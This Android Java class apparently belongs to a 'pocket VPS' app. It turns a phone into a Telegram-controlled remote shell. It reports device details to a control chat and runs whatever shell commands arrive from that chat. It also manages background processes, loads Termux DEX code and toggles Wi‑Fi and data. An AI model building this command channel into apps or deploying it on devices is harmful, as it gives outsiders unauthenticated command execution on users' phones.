package com.rx.pocketvps;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class TelegramManager {
    private static final String TAG = "RX_Telegram";

    private Context         context;
    private NetworkManager  networkManager;
    private ShellExecutor   shellExecutor;
    private TermuxLoader    termuxLoader;
    private ExecutorService executor;
    private boolean         running      = false;
    private int             lastUpdateId = 0;

    public TelegramManager(Context context) {
        this.context        = context;
        this.networkManager = new NetworkManager(context);
        this.shellExecutor  = new ShellExecutor();
        this.termuxLoader   = new TermuxLoader(context);
        this.executor       = Executors.newFixedThreadPool(4);
    }

    public void start() {
        running = true;
        registerDevice();
        executor.execute(this::pollLoop);
    }

    public void stop() {
        running = false;
        sendMessage("OFF:" + Config.DEVICE_ID);
        executor.shutdown();
    }

    private void registerDevice() {
        String net = networkManager.getNetworkType();
        String bat = networkManager.getBatteryLevel();
        sendMessage("REG:" + Config.DEVICE_ID + ":" + net + ":" + bat);
    }

    // ══════════════════════════
    //  POLL LOOP
    // ══════════════════════════
    private void pollLoop() {
        while (running) {
            try {
                if (networkManager.isOnline()) fetchAndProcess();
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                Log.e(TAG, "Poll: " + e.getMessage());
                try { Thread.sleep(Config.RECONNECT_DELAY); }
                catch (InterruptedException ie) { break; }
            }
        }
    }

    private void fetchAndProcess() throws Exception {
        String url = Config.API_BASE + "/getUpdates?offset=" + (lastUpdateId + 1)
                   + "&timeout=" + Config.POLL_TIMEOUT + "&allowed_updates=message";
        String resp = httpGet(url);
        if (resp == null) return;

        JSONObject json = new JSONObject(resp);
        if (!json.optBoolean("ok", false)) return;

        JSONArray results = json.getJSONArray("result");
        for (int i = 0; i < results.length(); i++) {
            JSONObject update = results.getJSONObject(i);
            lastUpdateId = update.getInt("update_id");
            if (!update.has("message")) continue;

            JSONObject msg  = update.getJSONObject("message");
            String     text = msg.optString("text", "");
            String     chat = String.valueOf(msg.getJSONObject("chat").getLong("id"));

            if (!chat.equals(Config.CONTROL_CHAT_ID)) continue;

            String prefix = "CMD:" + Config.DEVICE_ID + ":";
            if (text.startsWith(prefix)) {
                processCommand(text.substring(prefix.length()));
            }
        }
    }

    // ══════════════════════════════════════
    //  COMMAND PROCESSING
    // ══════════════════════════════════════
    private void processCommand(final String cmd) {
        executor.execute(() -> {
            String out;

            switch (cmd) {
                // ── System commands ─────────────────────
                case "STATUS":
                    out = "📱 " + Config.DEVICE_ID + "\n"
                        + "🌐 " + networkManager.getNetworkType() + "\n"
                        + "🔋 " + networkManager.getBatteryLevel();
                    break;

                case "WIFI_ON":
                    networkManager.enableWifi();
                    out = "✅ WiFi ON";
                    break;

                case "WIFI_OFF":
                    networkManager.disableWifi();
                    out = "✅ WiFi OFF";
                    break;

                case "DATA_ON":
                    networkManager.enableMobileData();
                    out = "✅ Data ON";
                    break;

                case "DATA_OFF":
                    networkManager.disableMobileData();
                    out = "✅ Data OFF";
                    break;

                // ── Termux DEX commands ──────────────────
                case "TERMUX_STATUS":
                    out = termuxLoader.isExtracted()
                        ? "✅ Termux DEX loaded & ready!\n"
                          + "   classes.dex  : ✅\n"
                          + "   classes2.dex : ✅"
                        : "❌ Termux DEX not loaded";
                    break;

                case "TERMUX_INIT":
                    boolean ok = termuxLoader.initialize();
                    out = ok ? "✅ Termux DEX initialized!" : "❌ Init failed";
                    break;

                // ── Background process commands ──────────
                default:
                    if (cmd.startsWith("BG_RUN ")) {
                        out = shellExecutor.executeBackground(cmd.substring(7));
                    } else if (cmd.equals("BG_LIST")) {
                        out = shellExecutor.listBackground();
                    } else if (cmd.startsWith("BG_LOG ")) {
                        try { out = shellExecutor.getBackgroundLog(Integer.parseInt(cmd.substring(7).trim())); }
                        catch (Exception e) { out = "Usage: BG_LOG <id>"; }
                    } else if (cmd.startsWith("BG_KILL ")) {
                        try { out = shellExecutor.killBackground(Integer.parseInt(cmd.substring(8).trim())); }
                        catch (Exception e) { out = "Usage: BG_KILL <id>"; }
                    } else if (cmd.startsWith("TERMUX_RUN ")) {
                        // Termux service ke through command
                        out = termuxLoader.runTermuxCommand(cmd.substring(11));
                    } else {
                        // Normal shell command
                        out = shellExecutor.execute(cmd);
                    }
            }

            sendMessage("OUT:" + Config.DEVICE_ID + ":" + out);
        });
    }

    // ══════════════════════════
    //  SEND MESSAGE
    // ══════════════════════════
    public void sendMessage(String text) {
        executor.execute(() -> {
            try {
                String params = "chat_id=" + URLEncoder.encode(Config.CONTROL_CHAT_ID, "UTF-8")
                              + "&text="   + URLEncoder.encode(text, "UTF-8");
                httpPost(Config.API_BASE + "/sendMessage", params);
            } catch (Exception e) {
                Log.e(TAG, "Send: " + e.getMessage());
            }
        });
    }

    // ── HTTP helpers ─────────────────────────
    private String httpGet(String u) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
            c.setConnectTimeout(10000);
            c.setReadTimeout((Config.POLL_TIMEOUT + 5) * 1000);
            if (c.getResponseCode() != 200) return null;
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder  s = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) s.append(line);
            r.close(); c.disconnect();
            return s.toString();
        } catch (Exception e) { return null; }
    }

    private void httpPost(String u, String params) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(10000);
            c.setReadTimeout(10000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            OutputStream os = c.getOutputStream();
            os.write(params.getBytes("UTF-8"));
            os.flush(); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception e) { Log.e(TAG, "POST: " + e.getMessage()); }
    }
}
